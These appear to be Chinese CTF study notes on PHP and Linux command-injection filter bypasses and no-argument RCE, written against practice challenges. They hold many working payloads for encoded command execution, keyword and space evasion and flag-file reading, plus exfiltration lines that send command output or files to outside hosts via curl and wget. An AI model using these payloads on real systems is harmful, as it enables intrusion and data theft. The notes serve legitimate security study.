#                                          命令执行：

### 基本的目的：

1.直接读取文件

2.一句话木马执行

3.特殊的2（用写文件写入同路径下的文件，通过一句话木马访问）



## 绕过方式：

### system绕过：

**shell_exec()**

**eval()**

**asssert()**

**exec()**

**preg_replace()**

**call_user_func()**

**passthru()**

**pctml_exec()**

**popen()**

**proc_open()**

### 编码绕过

如果命令注入的网站过滤了某些分割符，可以将分隔符编码后（url编码，base64等）绕过

### 换行污染：

在拼接是换行相当于删除了后面的内容（前提是没有/m(匹配多行)）

### 八进制绕过

```
$(printf "\154\163")//ls命令
```

这个编码后可以`拼接`

### 十六进制绕过

```
echo "636174202F6574632F706173737764" | xxd -r -p|bash
```

### 关键词绕过

通过拆分命令达到绕过的效果

```
a=l;b=s;$a$b
```

#### 空格过滤

linux内置分隔符

```
${IFS},$IFS,$IFS$9
root # cat${IFS}flag
weqweqweqweqweqwe
root # cat$IFS$9flag
weqweqweqweqweqwe
（网上找的）
>   <   <>   重定向符
%09(需要php环境)
${IFS}
$IFS$9
{cat,flag.php} //用逗号实现了空格功能
%20
%09
该题只能用%09进行空格绕过
关键是：%，$,<  >  <>  .{  }这些字符是否过滤
```

### 

#### cat绕过

***\*more:一页一页的显示档案内容\*******\*
\*******\*less:与 more 类似\*******\*
\*******\*head:查看头几行\*******\*
\*******\*tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\*******\*
\*******\*tail:查看尾几行\*******\*
\*******\*nl：显示的时候，顺便输出行号\*******\*
\*******\*od:以二进制的方式读取档案内容\*******\*
\*******\*vi:一种编辑器，这个也可以查看\*******\*
\*******\*vim:一种编辑器，这个也可以查看\*******\*
\*******\*sort:可以查看\*******\*
\*******\*uniq:可以查看\*******\*                 **uniq${IFS}f???.php**
\*******\*file -f:报错出具体内容\****

#### 空变量绕过

```
cat fl${x}ag
cat tes$(z)t/flag
```

#### 控制环境变量绕过

```
$PATH => "/usr/local/….blablabla”
${PATH:0:1} => '/'
${PATH:1:1} => 'u'
${PATH:0:4} => '/usr'
```

#### 空值绕过

```
cat fl""ag
cat fl''ag
cat "fl""ag"
```

#### 反斜杠绕过

```
ca\t flag
l\s
```

#### >，+绕过：

对于 >,+ 等 符号的过滤 ,`$PS2`变量为>,`$PS4`变量则为+

#### 空变量绕过

$*和$@，$x(x 代表 1-9),${x}(x>=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:

```
wh$1oami
who$@ami
whoa$*mi
```

### 花括号的用法

在Linux bash中还可以使用`{OS_COMMAND,ARGUMENT}`来执行系统命令
`{cat,flag}`

### 无回显的命令执行

可以通过curl命令将命令的结果输出到访问的url中

```
curl www.rayi.vip/`whoami`
```

在服务器日志中可看到

```
xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] "GET /root HTTP/1.1" 404 146 "-" "curl/7.58.0"
```

这样，命令的回显就能在日志中看到了

### 读文件命令

```
ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd
```

无回显的情况下wget带出

```
wget  --post-file flag 47.100.120.123:2333
```

### 参数逃逸：

**url/?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php**

文件包含前提：

allow_url_fopen = On

allow_url_include = On

**四个函数：include()  include_once()  require()  require_once()**

**理解:将c的内容作为php代码注入当前网页，（文件包含）**

在用一句话木马可以连接，也可以直接php伪协议输出当前的代码，在解码获取flag

 

## **函数解释：**localeconv()pos()array_reverse()show_source**

1.show_source() 函数对文件进行语法高亮显示。

本函数是 [highlight_file()](https://www.w3school.com.cn/php/func_misc_highlight_file.asp) 的别名。

2.localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)

3.pos()：返回数组中的当前元素的值。

4.array_reverse()：数组逆序 scandir()：获取目录下的文件

5.next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过

pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。具体

体现为print_r(scandir(pos(localeconv()));将含.的文件包含以数组的形式呈现

print_r(array_reverse(scandir(pos(localeconv())));将含.的文件包含以数组的形式呈现并将数组逆序

Print_r(next(array_reverse(scandir(pos(localeconv())))));将含.的文件包含以数组的形式呈现并将数组逆序,并将第二个文件输出舍弃其他的文件

 

**Payload:**  **?c=show_source(next(array_reverse(scandir(pos(localeconv())))));**

### 生成字典绕过：

好像是重新生成了一个字典

![img](https://raw.githubusercontent.com/odiws/blog-img/main/wps1.jpg) 

![img](https://raw.githubusercontent.com/odiws/blog-img/main/wps2.jpg) 

![img](https://raw.githubusercontent.com/odiws/blog-img/main/wps3.jpg) 

两个脚本以及rce_or.txt的创建

\1. cmd

\2. python exp.py url

\3. System

\4. Ls

\5. System

\6. Cat flag.php

### **知识点：通配符：**

· *星号，匹配任何字符

· ? 问号，匹配任意一个字符

· []中括号，匹配括号中的一个字符

 

所以也可以用f???????等于flag.php

### 知识点：Linux管道符

“|”是Linux管道命令操作符，简称管道符。使用此管道符“|”可以将两个命令分隔开，“|”左边命令的输出就会作为“|”右边命令的输入，此命令可连续使用，第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。

![img](https://raw.githubusercontent.com/odiws/blog-img/main/wps6.jpg) 

1.Less 分页显示

2.echo 输出

3.sort 排序

4.sort跟uniq结合使用才能有效去重，所以通过管道将sort处理后输出的文本丢给uniq处

***\*Payload：\*******\*?url=l’'s / | tee 1.txt\**** ***\*?url=c’'at /??? | tee 2.txt\**** 

（便于理解）

### 特殊方法：

#### 1.上传文件

先写一个叫文件的php代码上交给ctfshow的这个web55

再如图这样去写

然后最重要的是写ls或者cat flag.php时前面要空一格，有时候又不要，抽象

![img](https://raw.githubusercontent.com/odiws/blog-img/main/wps5.jpg)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://af404f5c-695a-42e7-b599-6e9abc26818e.challenge.ctf.show/" method="post" enctype="multipart/form-data">
    &lt;!&ndash;链接是当前打开的题目链接&ndash;&gt;
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

#### 2.取反运算：

双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。

 

echo ${_} #返回上一次的执行结果

echo $(()) #0

echo $((~$(()))) #~0是-1

$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2

echo $((~-37)) #~-37是36

$(($((~$(())))$((~$(())))))==-2

拆开看

 

$(( $((~$(()))) $((~$(()))) ))

$((~$(())))==-1 中间有两个所以是-2 是相加的 那中间有37个就是-37

然后取反就是36

playload：

？c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

#### 3.异或运算

这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：1^1=0,1^0=1,0^1=1,0^0=0，简单的来说就是相同为零，不同为一，

### 函数绕过：

1.show_source <===> highlight_file

2.var_dump() <===> var_export()

3.echo <===> print(), printf(), print_r()（将结果通过数组展示）

4.include <===> require,require_once,readfile(不知道怎么运作的，有时候有用)

### PHP列出目录下的文件

```php
1.print_r(scandir(current(localeconv()))); //print_r可替换成：var_dump;var_export;且scandir容易没权限。
2.print_r(glob("/*")); 这里的glob和scandir函数同理,但是无关权限。
3.$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString())." ";}
```

### 绕过关键字之点连接字符串（亲测没用）

```php
(p.h.p.i.n.f.o)();
(sy.(st).em)(whoami);
(sy.(st).em)(who.ami);
(s.y.s.t.e.m)("whoami");
```

### 2.利用session ?c=session_start();system(session_id()); 并且 Cookie: PHPSESSID=ls 读取文件的话需要利用其他姿势了，我实验不行，说有无效参数。。。

### 3.通过post上传临时文件并且执行。

通过post上传临时文件并且执行。原理：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

脚本： （与上传文件一样）

```
import requests

while True:    
    url = "http://44875025-cec2-4154-8d87-34cbdcff5f27.chall.ctf.show/?c=.+/???/????????[@-[]"    
    r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})    
    if r.text.find("flag") >0:        
        print(r.text)        
        break
```

## 无参数rce：

### 无参数RCE题目特征：

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {    
    eval($_GET['star']);
}

正则表达式 [^\W]+\((?R)?\) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。
scandir()可以使用里面不含参数
scandir('1')不可以使用，里面含有参数1，无法被替换删除



相关函数简要介绍：

#### 方法一：scandir()  最常规的通解

#### 方法二：session_id()

##### 法一：hex2bin（）

##### 法二：读文件

#### 方法三：getallheaders()

#### 方法四：get_defined_vars()

#### 方法五：dirname() & chdir()

无参数RCE题目特征：
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {    
    eval($_GET['star']);
}
正则表达式 [^\W]+\((?R)?\) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。

scandir()可以使用里面不含参数
scandir('1')不可以使用，里面含有参数1，无法被替换删除
相关函数简要介绍：
scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）
localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）
current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西
getcwd() :取得当前工作目录
dirname():函数返回路径中的目录部分
array_flip() :交换数组中的键和值，成功时返回交换后的数组
array_rand() :从数组中随机取出一个或多个单元

array_reverse():将数组内容反转

strrev():用于反转给定字符串

getcwd()：获取当前工作目录路径

dirname() ：函数返回路径中的目录部分。
chdir() ：函数改变当前的目录。

eval()、assert()：命令执行

hightlight_file()、show_source()、readfile()：读取文件内容

举个例子scandir('.')是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：

?参数=var_dump(scandir(current(localeconv())));
数组移动操作：

end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动
方法一：scandir()  最常规的通解
引入一道例题BuuCTF [GXYCTF2019]禁止套娃，代码如下：

<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

 第一眼看见第二个if语句，if(';' === preg_replace('/[a-z,_]+/', NULL, $_GET['exp']))可以看出这是典型的无参数rce,然后是后面的if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])，这里限制了phpinfo()，getcwd()这些函数用不了

最终payload为：

?exp=highligth_file(next(array_reverse(scandir(current(localeconv())))));
接下来逐个解析，1、 这里的var_dump(localeconv());我们能看见第一个string[1]就是一个“.”，这个点是由localeconv()产生的

2、 利用current()函数将这个点取出来的，‘.’代表的是当前目录，那接下来就很好理解了，我们可以利用这个点完成遍历目录的操作，相当于就是linux中的ls指令

3、既然current()取第一个值，那么current(localeconv())构造一个‘.’,而'.' 表示当前目录，scandir('.') 将返回当前目录中的文件和子目录，这里我们得知flag所在的文件名就是flag.php

4、然而flag的文件名在比较后端我们可以通过array_reverse()将数组内容反转，让它从倒数第二的位置变成正数第二

5、移动指针读取第二个数组，参照下列数组移动操作可知我们应选用next()函数：

end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动
6、最后用highlight_file()返回文件内容

使用最多最灵活的一个函数,可以构造出不同用法，这里直接引用了别人的payload：

highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
  //查看和读取根目录文件
  //查看和读取根目录文件
方法二：session_id()
 使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）

 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现

法一：hex2bin（）
我们自己手动对命令进行十六进制编码，后面在用函数hex2bin()解码转回去，使得后端实际接收到的是恶意代码。我们把想要执行的命令进行十六进制编码后，替换掉‘Cookie:PHPSESSID=’后面的值

以下是十六进制编码脚本：

<?php
$encoded = bin2hex("phpinfo();");
echo $encoded;
?>
得到phpinfo();的十六进制编码，即706870696e666f28293b

那么payload就可以是：

?参数=eval(hex2bin(session_id(session_start())));
同时更改cookie后的值为想执行的命令的十六进制编码

法二：读文件
例题依然是[GXYCTF2019]禁止套娃，在知道文件名为flag.php的情况下直接读文件

如果已知文件名，把文件名写在PHPSESSID后面，构造payload为：

readfile(session_id(session_start()));


方法三：getallheaders()
getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）

当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：

var_dump(end(getallheaders()));
这里借用别人的图演示：



sky是自己添加的请求头， end()指向最后一行的sky后的代码，达到phpinfo的目的，然后可以进一步去rce。

方法四：get_defined_vars()
相较于getallheaders（）更加具有普遍性，它可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE，

返回数组顺序为$_GET-->$_POST-->$_COOKIE-->$_FILES

首先确认是否有回显：

print_r(get_defined_vars());
假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：

a=eval(end(current(get_defined_vars())));&b=system('ls /');
把eval换成assert也行 ，能执行system('ls /')就行

方法五：chdir()&array_rand()赌狗读文件
实在无法rce，可以考虑目录遍历进行文件读取

利用getcwd()获取当前目录：

var_dump(getcwd());
结合dirname()列出当前工作目录的父目录中的所有文件和目录:

var_dump(scandir(dirname(getcwd())));
 读上一级文件名：

?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));

读根目录:

ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录

?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));

要用chdir()固定，payload：

 ?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));

通过bp的intruder模块来读到根目录：


